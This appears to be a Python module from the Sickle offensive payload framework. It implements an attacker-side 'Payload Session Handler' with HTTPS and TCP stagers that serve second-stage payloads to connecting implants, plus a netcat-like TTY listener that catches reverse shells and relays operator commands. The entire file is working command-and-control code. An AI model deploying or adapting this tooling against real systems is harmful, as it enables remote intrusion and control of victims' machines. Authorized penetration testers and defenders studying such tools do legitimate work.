import os
import sys
import ssl
import time
import struct
import socket
import threading
import http.server
import socketserver

from sickle.common.lib.generic import modparser

time_start = time.time()

class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        if (self.server.uri_path in self.path):
            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
            self.wfile.write(struct.pack('<Q', len(self.server.stage)))
            self.wfile.write(self.server.stage)

class TCPStagerHandler(socketserver.StreamRequestHandler):

    def handle(self):

        log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}")
        self.request.send(struct.pack('<Q', len(self.server.stage)))
        self.request.send(self.server.stage)

class SimpleTTYHandler(socketserver.StreamRequestHandler):

    def handle(self):

        log_print(f"Connection established with {self.client_address[0]}\n")

        while True:

            self.request.settimeout(0.1)

            response = b""
            while True:
                try:
                    data = self.request.recv(4096)
                except:
                    break

                response += data

            self.request.settimeout(30)

            shell_prompt = response.decode('latin-1')

            self.request.sendall(input(shell_prompt).encode('latin-1') + b'\n')

class Module():

    name = "Payload Session Handler"

    module = "handler"

    example_run = f"{sys.argv[0]} -m {module}"

    platform = "Multi"

    arch = "Multi"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Linux", "Windows"]

    summary = ""

    description = ("")

    arguments = {}
    arguments["HANDLER"] = {}
    arguments["HANDLER"]["optional"] = "no"
    arguments["HANDLER"]["description"] = "Handler for incoming connections"
    arguments["HANDLER"]["options"] = { "tty": "Simple TTY handler similiar to netcat for capturing a shell" }

    arguments["SRVHOST"] = {}
    arguments["SRVHOST"]["optional"] = "yes"
    arguments["SRVHOST"]["description"] = "IP to bind handler to"
    
    arguments["SRVPORT"] = {}
    arguments["SRVPORT"]["optional"] = "yes"
    arguments["SRVPORT"]["description"] = "Port to bind handler to"

    advanced = {}
    advanced["PATH"] = {}
    advanced["PATH"]["optional"] = "yes"
    advanced["PATH"]["description"] = "The path expected to be reached by our payload to send the second stage"

    def __init__(self, arg_object):
       
        self.arg_list  = arg_object["positional arguments"]
        self.stage     = arg_object["raw bytes"]

        self.set_args()

    def set_args(self):

        all_args = Module.arguments
        all_args.update(Module.advanced)
        argv_dict = modparser.argument_check(all_args, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        self.handler = argv_dict["HANDLER"]

        # Set the SRVHOST and SRVPORT to distribute payloads
        if "SRVHOST" not in argv_dict.keys():
            self.srvhost = "0.0.0.0"
        else:
            self.srvhost = argv_dict["SRVHOST"]

        if "SRVPORT" not in argv_dict.keys():
            self.srvport = 4242
        else:
            self.srvport = int(argv_dict["SRVPORT"])

        # Set the PATH used by HTTP(S) handlers
        if "PATH" not in argv_dict.keys():
            self.uri_path = "corn"
        else:
            self.uri_path = argv_dict["PATH"]

    def do_thing(self):

        if self.handler == "tty":
            self.start_tty_handler()
        elif self.handler == "tcp":
            self.start_tcp_handler()
        elif self.handler == "https":
            self.start_https_handler()
        else:
            print(f"{self.handler} is not a valid handler")
            exit(-1)

    def start_https_handler(self):
        
        s_addr = (self.srvhost, self.srvport)
        httpd = http.server.HTTPServer(s_addr, HTTPSStagerHandler)
        log_print(f"HTTPSStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")

        sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        sslctx.check_hostname = False
        sslctx.load_cert_chain(certfile='/opt/Sickle-Windows-Reverse-Shell/src/sickle/modules/de_cert.pem',
                               keyfile=None,
                               password=None)

        httpd.socket = sslctx.wrap_socket(httpd.socket,
                                          server_side=True)

        httpd.stage = self.stage
        httpd.uri_path = self.uri_path

        httpd.serve_forever()

    def start_tcp_handler(self):

        stage_server = socketserver.TCPServer((self.srvhost, self.srvport), TCPStagerHandler)
        log_print(f"TCPStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}")
        stage_server.stage = self.stage
        stage_server.serve_forever()

    def start_tty_handler(self):

        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}")
        server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
        server.stage = self.stage
        server.serve_forever()

def log_print(msg):
        
    elapsed = time.time() - time_start
    print(f"[{elapsed:12.6f}] {msg}")
    
    return
